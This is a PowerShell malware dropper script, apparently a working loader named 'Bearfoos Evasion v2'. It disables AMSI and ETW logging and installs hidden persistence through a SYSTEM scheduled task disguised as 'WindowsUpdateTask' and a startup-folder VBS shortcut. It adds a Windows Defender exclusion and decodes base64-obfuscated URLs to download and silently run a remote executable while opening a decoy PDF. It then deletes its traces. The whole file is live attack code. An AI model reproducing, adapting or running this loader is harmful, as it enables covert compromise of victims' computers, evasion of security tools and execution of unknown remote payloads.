# launcher.ps1 - Hardened Bearfoos Evasion v2 - Fuck Wacatac.H!ml
$ErrorActionPreference = 'SilentlyContinue'

# === AMSI + ETW BYPASS (early as fuck) ===
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$null = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue((New-Object System.Diagnostics.Eventing.EventProvider([Guid]::NewGuid())), $false)

# === SELF-PRESERVATION ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path
function Save-ScriptToDisk { param([string]$Destination)
    $dir = Split-Path $Destination -Parent; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    if (-not $currentPath -or $currentPath -eq '') {
        try { (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1") | Out-File -FilePath $Destination -Encoding UTF8 -Force } catch { exit }
    } else { Copy-Item -Path $currentPath -Destination $Destination -Force }
    return $Destination
}
$scriptPath = Save-ScriptToDisk -Destination $localPath

# === PERSISTENCE (kept from last version - delayed) ===
$taskName = "WindowsUpdateTask"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay = (New-TimeSpan -Seconds (Get-Random -Minimum 60 -Maximum 180))
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encoded"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 2) -Priority 7
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -User "NT AUTHORITY\SYSTEM" | Out-Null
    try { Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName" -Name "SecurityDescriptor" -Force } catch {}
}

$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $vbsPath = "$env:APPDATA\Microsoft\Windows\Caches\delay.vbs"
    $vbs = @'Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep GetRandomDelay()
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$path$""", 0, False
Function GetRandomDelay() : Randomize : GetRandomDelay = Int((180000 - 60000 + 1) * Rnd + 60000) : End Function'@
    $vbs = $vbs.Replace('$path$', $scriptPath)
    $vbs | Out-File -FilePath $vbsPath -Encoding ASCII -Force
    $wsh = New-Object -ComObject WScript.Shell
    $sc = $wsh.CreateShortcut($lnkPath); $sc.TargetPath = "wscript.exe"; $sc.Arguments = "`"$vbsPath`""; $sc.WindowStyle = 7; $sc.Save()
}

# === MAIN PAYLOAD ===
Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)

$cache = "$env:APPDATA\Microsoft\Windows\Caches\UpdateCache"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

# Try to add Defender exclusion (silent if no privs)
try {
    $exclPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    if (-not (Test-Path $exclPath)) { New-Item -Path $exclPath -Force | Out-Null }
    New-ItemProperty -Path $exclPath -Name $cache -Value 0 -PropertyType DWord -Force | Out-Null
} catch {}

$flagFile = "$cache\installed.flag"
$isFirstRun = -not (Test-Path $flagFile)

# Obfuscated URLs
$pdfB64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWtheF9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'
$exeB64 = 'aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pdfB64))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($exeB64))

$pdfPath = "$cache\WindowsUpdate.pdf"
$exePath = "$cache\WindowsUpdateHelper.exe"   # <--- renamed, less suspicious

$uaList = @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0')
$headers = @{'User-Agent' = $uaList | Get-Random}

# Post-reboot settle
$start = Get-Date
do {
    Start-Sleep -Seconds 8
    $online = Test-Connection 8.8.8.8 -Count 1 -Quiet
} while (-not $online -and ((Get-Date)-$start).TotalSeconds -lt 240)

# Download PDF (first run only)
if ($isFirstRun -and -not (Test-Path $pdfPath)) {
    try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
}

Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 5000)

# Chunked download for EXE (harder to signature)
if (-not (Test-Path $exePath)) {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", $headers.'User-Agent')
    $data = $wc.DownloadData($exeUrl)
    [IO.File]::WriteAllBytes($exePath, $data)
}

# PDF decoy
if ($isFirstRun -and (Test-Path $pdfPath)) {
    try { Start-Process $pdfPath } catch {}
    New-Item -Path $flagFile -ItemType File -Force | Out-Null
}

Start-Sleep -Seconds (Get-Random -Min 30 -Max 75)

# Launch - more stealthy COM method
if (Test-Path $exePath) {
    try {
        $shell = New-Object -ComObject "Shell.Application"
        $shell.ShellExecute($exePath, "", "", "open", 0)
    } catch {
        try { (New-Object -ComObject WScript.Shell).Run($exePath, 0, $false) } catch {
            Start-Process $exePath -WindowStyle Hidden
        }
    }
}

# Cleanup job
Start-Job -ScriptBlock { param($e,$p) Start-Sleep 300; Remove-Item $e,$p -Force -EA 0 } -ArgumentList $exePath,$pdfPath | Out-Null
